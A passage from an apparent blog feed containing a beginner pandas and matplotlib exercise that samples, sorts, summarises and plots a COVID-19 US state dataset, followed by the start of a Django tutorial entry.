<td>1215.1991</td>      <td>0.4813</td>      <td>1822</td>      <td>67609</td>      <td>69378</td>      <td>...</td>      <td>82</td>      <td>8859</td>      <td>8.1</td>      <td>1.0</td>      <td>52.70</td>      <td>94.7</td>      <td>0.31</td>      <td>0.38</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>32</td>      <td>New Mexico</td>      <td>36632</td>      <td>1798</td>      <td>51</td>      <td>2096640</td>      <td>17.2850</td>      <td>0.4769</td>      <td>340</td>      <td>41198</td>      <td>46954</td>      <td>...</td>      <td>41</td>      <td>7214</td>      <td>6.0</td>      <td>1.0</td>      <td>53.40</td>      <td>77.4</td>      <td>0.33</td>      <td>0.36</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>33</td>      <td>Nevada</td>      <td>30751</td>      <td>3626</td>      <td>155</td>      <td>3139658</td>      <td>28.5993</td>      <td>0.4577</td>      <td>900</td>      <td>48225</td>      <td>55269</td>      <td>...</td>      <td>44</td>      <td>6714</td>      <td>9.0</td>      <td>1.0</td>      <td>49.90</td>      <td>94.2</td>      <td>0.32</td>      <td>0.40</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>34</td>      <td>New York</td>      <td>596532</td>      <td>236732</td>      <td>12192</td>      <td>19440469</td>      <td>412.5211</td>      <td>0.5229</td>      <td>3952</td>      <td>68667</td>      <td>85746</td>      <td>...</td>      <td>166</td>      <td>9778</td>      <td>6.6</td>      <td>3.0</td>      <td>45.40</td>      <td>87.9</td>      <td>0.31</td>      <td>0.39</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>35</td>      <td>Ohio</td>      <td>83131</td>      <td>10222</td>      <td>451</td>      <td>11747694</td>      <td>287.5038</td>      <td>0.4680</td>      <td>3314</td>      <td>48242</td>      <td>57492</td>      <td>...</td>      <td>194</td>      <td>8712</td>      <td>8.5</td>      <td>3.0</td>      <td>50.70</td>      <td>77.9</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/17/20</td>    </tr>    <tr>      <td>36</td>      <td>Oklahoma</td>      <td>35561</td>      <td>2465</td>      <td>136</td>      <td>3954821</td>      <td>57.6547</td>      <td>0.4645</td>      <td>1064</td>      <td>46128</td>      <td>50613</td>      <td>...</td>      <td>125</td>      <td>7627</td>      <td>8.2</td>      <td>0.0</td>      <td>59.60</td>      <td>66.2</td>      <td>0.35</td>      <td>0.37</td>      <td>0.29</td>      <td>03/17/20</td>    </tr>    <tr>      <td>37</td>      <td>Oregon</td>      <td>37583</td>      <td>1844</td>      <td>72</td>      <td>4301089</td>      <td>44.8086</td>      <td>0.4583</td>      <td>659</td>      <td>49908</td>      <td>56956</td>      <td>...</td>      <td>61</td>      <td>8044</td>      <td>7.8</td>      <td>1.0</td>      <td>48.40</td>      <td>81.0</td>      <td>0.30</td>      <td>0.39</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>38</td>      <td>Pennsylvania</td>      <td>153965</td>      <td>31069</td>      <td>836</td>      <td>12820878</td>      <td>286.5449</td>      <td>0.4689</td>      <td>3169</td>      <td>55349</td>      <td>61594</td>      <td>...</td>      <td>199</td>      <td>9258</td>      <td>9.2</td>      <td>2.0</td>      <td>48.80</td>      <td>78.7</td>      <td>0.30</td>      <td>0.37</td>      <td>0.32</td>      <td>03/16/20</td>    </tr>    <tr>      <td>39</td>      <td>Rhode Island</td>      <td>10933</td>      <td>1118</td>      <td>60</td>      <td>1056161</td>      <td>1021.4323</td>      <td>0.4781</td>      <td>279</td>      <td>54523</td>      <td>57852</td>      <td>...</td>      <td>11</td>      <td>9551</td>      <td>7.3</td>      <td>0.0</td>      <td>50.10</td>      <td>90.7</td>      <td>0.29</td>      <td>0.39</td>      <td>0.32</td>      <td>03/16/20</td>    </tr>    <tr>      <td>40</td>      <td>South Carolina</td>      <td>32826</td>      <td>4491</td>      <td>137</td>      <td>5210095</td>      <td>173.3174</td>      <td>0.4735</td>      <td>1225</td>      <td>42736</td>      <td>45280</td>      <td>...</td>      <td>69</td>      <td>7311</td>      <td>7.4</td>      <td>0.0</td>      <td>62.40</td>      <td>66.3</td>      <td>0.32</td>      <td>0.36</td>      <td>0.32</td>      <td>03/16/20</td>    </tr>    <tr>      <td>41</td>      <td>South Dakota</td>      <td>38833</td>      <td>4246</td>      <td>119</td>      <td>903027</td>      <td>11.9116</td>      <td>0.4495</td>      <td>152</td>      <td>50141</td>      <td>58624</td>      <td>...</td>      <td>57</td>      <td>8933</td>      <td>5.1</td>      <td>0.0</td>      <td>45.20</td>      <td>56.7</td>      <td>0.35</td>      <td>0.35</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>42</td>      <td>Tennessee</td>      <td>11661</td>      <td>1542</td>      <td>7</td>      <td>6897576</td>      <td>167.2748</td>      <td>0.4790</td>      <td>2209</td>      <td>47179</td>      <td>53933</td>      <td>...</td>      <td>115</td>      <td>7372</td>      <td>7.4</td>      <td>1.0</td>      <td>57.60</td>      <td>66.4</td>      <td>0.33</td>      <td>0.38</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>43</td>      <td>Texas</td>      <td>90586</td>      <td>6762</td>      <td>145</td>      <td>29472295</td>      <td>112.8204</td>      <td>0.4800</td>      <td>6199</td>      <td>49161</td>      <td>61167</td>      <td>...</td>      <td>523</td>      <td>6998</td>      <td>8.3</td>      <td>6.0</td>      <td>64.80</td>      <td>84.7</td>      <td>0.36</td>      <td>0.39</td>      <td>0.24</td>      <td>03/23/20</td>    </tr>    <tr>      <td>44</td>      <td>Utah</td>      <td>176239</td>      <td>18260</td>      <td>453</td>      <td>3282115</td>      <td>39.9430</td>      <td>0.4063</td>      <td>565</td>      <td>45340</td>      <td>55550</td>      <td>...</td>      <td>54</td>      <td>5982</td>      <td>8.4</td>      <td>1.0</td>      <td>48.60</td>      <td>90.6</td>      <td>0.42</td>      <td>0.37</td>      <td>0.21</td>      <td>03/16/20</td>    </tr>    <tr>      <td>45</td>      <td>Virginia</td>      <td>59944</td>      <td>2931</td>      <td>25</td>      <td>8626207</td>      <td>218.4403</td>      <td>0.4705</td>      <td>1654</td>      <td>56952</td>      <td>62563</td>      <td>...</td>      <td>96</td>      <td>7556</td>      <td>6.9</td>      <td>2.0</td>      <td>55.10</td>      <td>75.5</td>      <td>0.33</td>      <td>0.38</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>46</td>      <td>Vermont</td>      <td>51931</td>      <td>8053</td>      <td>258</td>      <td>628061</td>      <td>68.1416</td>      <td>0.4539</td>      <td>94</td>      <td>53598</td>      <td>53523</td>      <td>...</td>      <td>14</td>      <td>10190</td>      <td>5.1</td>      <td>0.0</td>      <td>42.90</td>      <td>38.9</td>      <td>0.27</td>      <td>0.36</td>      <td>0.36</td>      <td>03/18/20</td>    </tr>    <tr>      <td>47</td>      <td>Washington</td>      <td>12116</td>      <td>779</td>      <td>35</td>      <td>7797095</td>      <td>117.3272</td>      <td>0.4591</td>      <td>1265</td>      <td>60781</td>      <td>74182</td>      <td>...</td>      <td>92</td>      <td>7913</td>      <td>8.0</td>      <td>1.0</td>      <td>48.30</td>      <td>84.1</td>      <td>0.31</td>      <td>0.40</td>      <td>0.29</td>      <td>03/17/20</td>    </tr>    <tr>      <td>48</td>      <td>Wisconsin</td>      <td>131984</td>      <td>11802</td>      <td>624</td>      <td>5851754</td>      <td>108.0497</td>      <td>0.4498</td>      <td>1159</td>      <td>50756</td>      <td>57720</td>      <td>...</td>      <td>133</td>      <td>8702</td>      <td>6.8</td>      <td>1.0</td>      <td>43.10</td>      <td>70.2</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/18/20</td>    </tr>    <tr>      <td>49</td>      <td>West Virginia</td>      <td>48161</td>      <td>4199</td>      <td>211</td>      <td>1778070</td>      <td>73.9691</td>      <td>0.4711</td>      <td>653</td>      <td>40578</td>      <td>43053</td>      <td>...</td>      <td>56</td>      <td>9462</td>      <td>7.6</td>      <td>0.0</td>      <td>51.80</td>      <td>48.7</td>      <td>0.29</td>      <td>0.36</td>      <td>0.35</td>      <td>03/16/20</td>    </tr>    <tr>      <td>50</td>      <td>Wyoming</td>      <td>19794</td>      <td>825</td>      <td>18</td>      <td>567025</td>      <td>5.8400</td>      <td>0.4360</td>      <td>102</td>      <td>60095</td>      <td>69900</td>      <td>...</td>      <td>29</td>      <td>8320</td>      <td>5.0</td>      <td>0.0</td>      <td>42.00</td>      <td>64.8</td>      <td>0.32</td>      <td>0.36</td>      <td>0.31</td>      <td>03/20/20</td>    </tr>  </tbody></table><p>51 rows × 26 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.keys()</span><br></pre></td></tr></table></figure><pre><code>Index([&apos;State&apos;, &apos;Tested&apos;, &apos;Infected&apos;, &apos;Deaths&apos;, &apos;Population&apos;, &apos;Pop Density&apos;,       &apos;Gini&apos;, &apos;ICU Beds&apos;, &apos;Income&apos;, &apos;GDP&apos;, &apos;Unemployment&apos;, &apos;Sex Ratio&apos;,       &apos;Smoking Rate&apos;, &apos;Flu Deaths&apos;, &apos;Respiratory Deaths&apos;, &apos;Physicians&apos;,       &apos;Hospitals&apos;, &apos;Health Spending&apos;, &apos;Pollution&apos;, &apos;Med-Large Airports&apos;,       &apos;Temperature&apos;, &apos;Urban&apos;, &apos;Age 0-25&apos;, &apos;Age 26-54&apos;, &apos;Age 55+&apos;,       &apos;School Closure Date&apos;],      dtype=&apos;object&apos;)</code></pre><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p> Get 20 data items as sample randomly and show them.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df1 = df.sample(frac=<span class="number">0.4</span>)</span><br><span class="line">df1</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th {    vertical-align: top;}.dataframe thead th {    text-align: right;}</code></pre><p></style></p><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>State</th>      <th>Tested</th>      <th>Infected</th>      <th>Deaths</th>      <th>Population</th>      <th>Pop Density</th>      <th>Gini</th>      <th>ICU Beds</th>      <th>Income</th>      <th>GDP</th>      <th>...</th>      <th>Hospitals</th>      <th>Health Spending</th>      <th>Pollution</th>      <th>Med-Large Airports</th>      <th>Temperature</th>      <th>Urban</th>      <th>Age 0-25</th>      <th>Age 26-54</th>      <th>Age 55+</th>      <th>School Closure Date</th>    </tr>  </thead>  <tbody>    <tr>      <td>26</td>      <td>Montana</td>      <td>10569</td>      <td>426</td>      <td>10</td>      <td>1086759</td>      <td>7.4668</td>      <td>0.4667</td>      <td>165</td>      <td>47120</td>      <td>46609</td>      <td>...</td>      <td>56</td>      <td>8221</td>      <td>6.6</td>      <td>0.0</td>      <td>42.7</td>      <td>55.9</td>      <td>0.31</td>      <td>0.35</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>22</td>      <td>Michigan</td>      <td>107791</td>      <td>30791</td>      <td>2308</td>      <td>10045029</td>      <td>177.6655</td>      <td>0.4695</td>      <td>2423</td>      <td>47582</td>      <td>53209</td>      <td>...</td>      <td>144</td>      <td>8055</td>      <td>8.0</td>      <td>1.0</td>      <td>44.4</td>      <td>74.6</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/16/20</td>    </tr>    <tr>      <td>15</td>      <td>Indiana</td>      <td>56873</td>      <td>10641</td>      <td>545</td>      <td>6745354</td>      <td>188.2810</td>      <td>0.4527</td>      <td>1861</td>      <td>46646</td>      <td>55172</td>      <td>...</td>      <td>132</td>      <td>8300</td>      <td>8.4</td>      <td>1.0</td>      <td>51.7</td>      <td>72.4</td>      <td>0.34</td>      <td>0.37</td>      <td>0.29</td>      <td>03/19/20</td>    </tr>    <tr>      <td>11</td>      <td>Hawaii</td>      <td>23215</td>      <td>574</td>      <td>9</td>      <td>1412687</td>      <td>219.9419</td>      <td>0.4420</td>      <td>201</td>      <td>54565</td>      <td>64096</td>      <td>...</td>      <td>22</td>      <td>7299</td>      <td>5.4</td>      <td>2.0</td>      <td>70.0</td>      <td>91.9</td>      <td>0.30</td>      <td>0.37</td>      <td>0.32</td>      <td>03/23/20</td>    </tr>    <tr>      <td>14</td>      <td>Illinois</td>      <td>137404</td>      <td>29160</td>      <td>1259</td>      <td>12659682</td>      <td>228.0243</td>      <td>0.4810</td>      <td>3144</td>      <td>56933</td>      <td>67268</td>      <td>...</td>      <td>187</td>      <td>8262</td>      <td>9.3</td>      <td>2.0</td>      <td>51.8</td>      <td>88.5</td>      <td>0.33</td>      <td>0.38</td>      <td>0.28</td>      <td>03/17/20</td>    </tr>    <tr>      <td>6</td>      <td>Connecticut</td>      <td>58213</td>      <td>17550</td>      <td>1086</td>      <td>3563077</td>      <td>735.8689</td>      <td>0.4945</td>      <td>674</td>      <td>74561</td>      <td>76342</td>      <td>...</td>      <td>32</td>      <td>9859</td>      <td>7.2</td>      <td>1.0</td>      <td>49.0</td>      <td>88.0</td>      <td>0.30</td>      <td>0.38</td>      <td>0.32</td>      <td>03/17/20</td>    </tr>    <tr>      <td>41</td>      <td>South Dakota</td>      <td>38833</td>      <td>4246</td>      <td>119</td>      <td>903027</td>      <td>11.9116</td>      <td>0.4495</td>      <td>152</td>      <td>50141</td>      <td>58624</td>      <td>...</td>      <td>57</td>      <td>8933</td>      <td>5.1</td>      <td>0.0</td>      <td>45.2</td>      <td>56.7</td>      <td>0.35</td>      <td>0.35</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>49</td>      <td>West Virginia</td>      <td>48161</td>      <td>4199</td>      <td>211</td>      <td>1778070</td>      <td>73.9691</td>      <td>0.4711</td>      <td>653</td>      <td>40578</td>      <td>43053</td>      <td>...</td>      <td>56</td>      <td>9462</td>      <td>7.6</td>      <td>0.0</td>      <td>51.8</td>      <td>48.7</td>      <td>0.29</td>      <td>0.36</td>      <td>0.35</td>      <td>03/16/20</td>    </tr>    <tr>      <td>28</td>      <td>North Dakota</td>      <td>12963</td>      <td>528</td>      <td>9</td>      <td>761723</td>      <td>11.0393</td>      <td>0.4533</td>      <td>238</td>      <td>54306</td>      <td>72597</td>      <td>...</td>      <td>39</td>      <td>9851</td>      <td>4.6</td>      <td>0.0</td>      <td>40.4</td>      <td>59.9</td>      <td>0.35</td>      <td>0.37</td>      <td>0.28</td>      <td>03/16/20</td>    </tr>    <tr>      <td>25</td>      <td>Mississippi</td>      <td>37733</td>      <td>3974</td>      <td>152</td>      <td>2989260</td>      <td>63.7056</td>      <td>0.4828</td>      <td>824</td>      <td>37994</td>      <td>37948</td>      <td>...</td>      <td>99</td>      <td>7646</td>      <td>7.7</td>      <td>0.0</td>      <td>63.4</td>      <td>49.4</td>      <td>0.35</td>      <td>0.36</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>42</td>      <td>Tennessee</td>      <td>11661</td>      <td>1542</td>      <td>7</td>      <td>6897576</td>      <td>167.2748</td>      <td>0.4790</td>      <td>2209</td>      <td>47179</td>      <td>53933</td>      <td>...</td>      <td>115</td>      <td>7372</td>      <td>7.4</td>      <td>1.0</td>      <td>57.6</td>      <td>66.4</td>      <td>0.33</td>      <td>0.38</td>      <td>0.29</td>      <td>03/20/20</td>    </tr>    <tr>      <td>30</td>      <td>New Hampshire</td>      <td>13424</td>      <td>1342</td>      <td>38</td>      <td>1371246</td>      <td>153.1605</td>      <td>0.4304</td>      <td>242</td>      <td>61405</td>      <td>63067</td>      <td>...</td>      <td>28</td>      <td>9589</td>      <td>4.4</td>      <td>0.0</td>      <td>43.8</td>      <td>60.3</td>      <td>0.28</td>      <td>0.37</td>      <td>0.34</td>      <td>03/16/20</td>    </tr>    <tr>      <td>29</td>      <td>Nebraska</td>      <td>13753</td>      <td>1138</td>      <td>24</td>      <td>1952570</td>      <td>25.4161</td>      <td>0.4477</td>      <td>440</td>      <td>52110</td>      <td>63942</td>      <td>...</td>      <td>93</td>      <td>8412</td>      <td>7.1</td>      <td>1.0</td>      <td>48.8</td>      <td>73.1</td>      <td>0.35</td>      <td>0.37</td>      <td>0.29</td>      <td>NaN</td>    </tr>    <tr>      <td>35</td>      <td>Ohio</td>      <td>83131</td>      <td>10222</td>      <td>451</td>      <td>11747694</td>      <td>287.5038</td>      <td>0.4680</td>      <td>3314</td>      <td>48242</td>      <td>57492</td>      <td>...</td>      <td>194</td>      <td>8712</td>      <td>8.5</td>      <td>3.0</td>      <td>50.7</td>      <td>77.9</td>      <td>0.32</td>      <td>0.37</td>      <td>0.31</td>      <td>03/17/20</td>    </tr>    <tr>      <td>3</td>      <td>Arizona</td>      <td>51045</td>      <td>4719</td>      <td>177</td>      <td>7378494</td>      <td>64.9550</td>      <td>0.4713</td>      <td>1559</td>      <td>43650</td>      <td>48055</td>      <td>...</td>      <td>83</td>      <td>6452</td>      <td>9.7</td>      <td>1.0</td>      <td>60.3</td>      <td>89.8</td>      <td>0.33</td>      <td>0.36</td>      <td>0.30</td>      <td>03/16/20</td>    </tr>    <tr>      <td>12</td>      <td>Iowa</td>      <td>22947</td>      <td>2513</td>      <td>74</td>      <td>3179849</td>      <td>56.9284</td>      <td>0.4451</td>      <td>545</td>      <td>48823</td>      <td>59977</td>      <td>...</td>      <td>118</td>      <td>8200</td>      <td>7.1</td>      <td>0.0</td>      <td>47.8</td>      <td>64.0</td>      <td>0.34</td>      <td>0.36</td>      <td>0.30</td>      <td>NaN</td>    </tr>    <tr>      <td>24</td>      <td>Missouri</td>      <td>53525</td>      <td>5517</td>      <td>175</td>      <td>6169270</td>      <td>89.7453</td>      <td>0.4646</td>      <td>1888</td>      <td>46635</td>      <td>51699</td>      <td>...</td>      <td>122</td>      <td>8107</td>      <td>7.5</td>      <td>2.0</td>      <td>54.6</td>      <td>70.4</td>      <td>0.33</td>      <td>0.37</td>      <td>0.31</td>      <td>03/19/20</td>    </tr>    <tr>      <td>31</td>      <td>New Jersey</td>      <td>162536</td>      <td>81420</td>      <td>4070</td>      <td>8936574</td>      <td>1215.1991</td>      <td>0.4813</td>      <td>1822</td>      <td>67609</td>      <td>69378</td>      <td>...</td>      <td>82</td>      <td>8859</td>      <td>8.1</td>      <td>1.0</td>      <td>52.7</td>      <td>94.7</td>      <td>0.31</td>      <td>0.38</td>      <td>0.30</td>      <td>03/18/20</td>    </tr>    <tr>      <td>20</td>      <td>Maryland</td>      <td>65370</td>      <td>12308</td>      <td>463</td>      <td>6083116</td>      <td>626.6731</td>      <td>0.4499</td>      <td>1134</td>      <td>62914</td>      <td>68573</td>      <td>...</td>      <td>50</td>      <td>8602</td>      <td>7.7</td>      <td>1.0</td>      <td>54.2</td>      <td>87.2</td>      <td>0.31</td>      <td>0.39</td>      <td>0.29</td>      <td>03/16/20</td>    </tr>    <tr>      <td>4</td>      <td>California</td>      <td>266900</td>      <td>28963</td>      <td>1072</td>      <td>39937489</td>      <td>256.3727</td>      <td>0.4899</td>      <td>7338</td>      <td>62586</td>      <td>74205</td>      <td>...</td>      <td>359</td>      <td>7549</td>      <td>12.8</td>      <td>9.0</td>      <td>59.4</td>      <td>95.0</td>      <td>0.33</td>      <td>0.40</td>      <td>0.26</td>      <td>03/19/20</td>    </tr>  </tbody></table><p>20 rows × 26 columns</p></div><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>Show 10 data items which the Deaths are more than 100 as sample randomly.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df2 = df[df[<span class="string">'Deaths'</span>]&gt;<span class="number">100</span>]</span><br><span class="line">df3 = df2.sample(n = <span class="number">10</span>)</span><br><span class="line">df3</span><br></pre></td></tr></table></figure><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p> Sort the data by GDP and present the top 20 data items.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4= df.sort_values(by=[<span class="string">'GDP'</span>])</span><br><span class="line">df4.iloc[<span class="number">0</span>:<span class="number">20</span>,]</span><br></pre></td></tr></table></figure><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p> Show the simple statistical information (mean, std, min, max, quartile1, quartile2, quartile3).</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.mean</span></span><br><span class="line">print(df.mean())<span class="comment"># 列平均</span></span><br><span class="line">print(df.mean(<span class="number">1</span>))<span class="comment"># 行平均</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2.std</span></span><br><span class="line">print(df.std()) <span class="comment"># 列std</span></span><br><span class="line">print(df.std(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3.min</span></span><br><span class="line">print(df.min())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 4.df.min()</span></span><br><span class="line">df.max()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 5.quartile1</span></span><br><span class="line">df.quantile()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 6.</span></span><br><span class="line">df.quantile(q=<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 7.</span></span><br><span class="line">df.quantile(q=<span class="number">0.75</span>)</span><br></pre></td></tr></table></figure><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p> Use matplotlib show 2D images about data.</p><p><a href="https://matplotlib.org/" target="_blank" rel="noopener">Matplotlib</a></p><p>Plot the distribution of two class (1. GDP &lt; 58000, 2. GDP &gt;= 58000) of COVID-19 State Data using different colors and different  marker where x-axis is the Pollution and y-axis the Mortality-rate.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">df_GDP1 = df[df[<span class="string">'GDP'</span>]&lt;<span class="number">58000</span>]</span><br><span class="line">df_GDP2 = df[df[<span class="string">'GDP'</span>]&gt;=<span class="number">58000</span>]</span><br><span class="line">plt.figure()</span><br><span class="line">ax1 = df_GDP1.plot(x=<span class="string">'Pollution'</span>,y=<span class="string">'Deaths'</span>)</span><br><span class="line">df_GDP2.plot(x=<span class="string">'Pollution'</span>,y=<span class="string">'Deaths'</span>,ax=ax1)</span><br><span class="line"><span class="comment"># 为图表添加标题</span></span><br><span class="line">plt.title(<span class="string">"testddddd"</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>&lt;Figure size 432x288 with 0 Axes&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426output02.png" alt="png"></p><h2 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h2><p>Show the proportion of three class of COVID-19 State Data using pie chart.</p><p><strong><font color = blue size=3> About the class: </font></strong> <p><br> 1、 Mortality-rate &lt; 0.02 <p><br> 2、 Mortality-rate between 0.02 and 0.03 <p><br> 3、Mortality-rate &gt; 0.03 <p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 死亡率&lt;0.02</span></span><br><span class="line">sizes= []</span><br><span class="line">df_death1 = df[df[<span class="string">'Deaths'</span>]/df[<span class="string">'Infected'</span>]&lt;<span class="number">0.02</span>]</span><br><span class="line">d1= df_death1.shape[<span class="number">0</span>]  <span class="comment"># 返回行数</span></span><br><span class="line">sizes.append(d1)</span><br><span class="line"><span class="comment"># 死亡率在0.02 and 0.03之间</span></span><br><span class="line">df_death2 = df[df[<span class="string">'Deaths'</span>]/df[<span class="string">'Infected'</span>]&lt;=<span class="number">0.03</span>]</span><br><span class="line">d2 = df_death2.shape[<span class="number">0</span>] - d1</span><br><span class="line">sizes.append(d2)</span><br><span class="line"><span class="comment"># 死亡率在0.03之上</span></span><br><span class="line">df_death3 = df[df[<span class="string">'Deaths'</span>]/df[<span class="string">'Infected'</span>]&gt;<span class="number">0.03</span>]</span><br><span class="line">d3 = df_death3.shape[<span class="number">0</span>]</span><br><span class="line">sizes.append(d3)</span><br><span class="line"></span><br><span class="line">labels = [<span class="string">'Mortality-rate &lt; 0.02'</span>,<span class="string">' Mortality-rate between 0.02 and 0.03'</span>,<span class="string">'Mortality-rate &gt; 0.03'</span>]</span><br><span class="line">plt.pie(sizes,labels=labels,autopct=<span class="string">'%1.1f%%'</span>,shadow=<span class="literal">False</span>,startangle=<span class="number">150</span>)</span><br><span class="line">plt.axis(<span class="string">'equal'</span>)   <span class="comment">#该行代码使饼图长宽相等</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20426output02.png" alt="png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>饼图绘制：<ul><li><a href="https://www.cnblogs.com/biyoulin/p/9565350.html" target="_blank" rel="noopener">https://www.cnblogs.com/biyoulin/p/9565350.html</a></li><li><a href="https://www.jianshu.com/p/0a76c94e9db7" target="_blank" rel="noopener">https://www.jianshu.com/p/0a76c94e9db7</a></li><li><a href="https://blog.csdn.net/ChenVast/article/details/81632794" target="_blank" rel="noopener">https://blog.csdn.net/ChenVast/article/details/81632794</a></li></ul></li><li>Panda DataFrame 绘图<ul><li><a href="https://blog.csdn.net/weixin_39778570/article/details/81143763" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39778570/article/details/81143763</a></li></ul></li><li>Pandas数据帧（DataFrame）<ul><li><a href="https://www.yiibai.com/pandas/python_pandas_dataframe.html" target="_blank" rel="noopener">https://www.yiibai.com/pandas/python_pandas_dataframe.html</a></li><li><a href="https://www.cnblogs.com/dev-liu/p/pandas_plt_basic.html" target="_blank" rel="noopener">https://www.cnblogs.com/dev-liu/p/pandas_plt_basic.html</a></li><li><a href="https://blog.csdn.net/zhengxu25689/article/details/87347700" target="_blank" rel="noopener">https://blog.csdn.net/zhengxu25689/article/details/87347700</a></li></ul></li><li>其他<br>  <a href="https://blog.csdn.net/kylinxjd/article/details/98307811" target="_blank" rel="noopener">https://blog.csdn.net/kylinxjd/article/details/98307811</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Django】1. Django入门与实践-入门</title>
      <link href="2020/04/20/1.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%85%A5%E9%97%A8/"/>
      <url>2020/04/20/1.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%85%A5%E9%97%A8/</url>
      
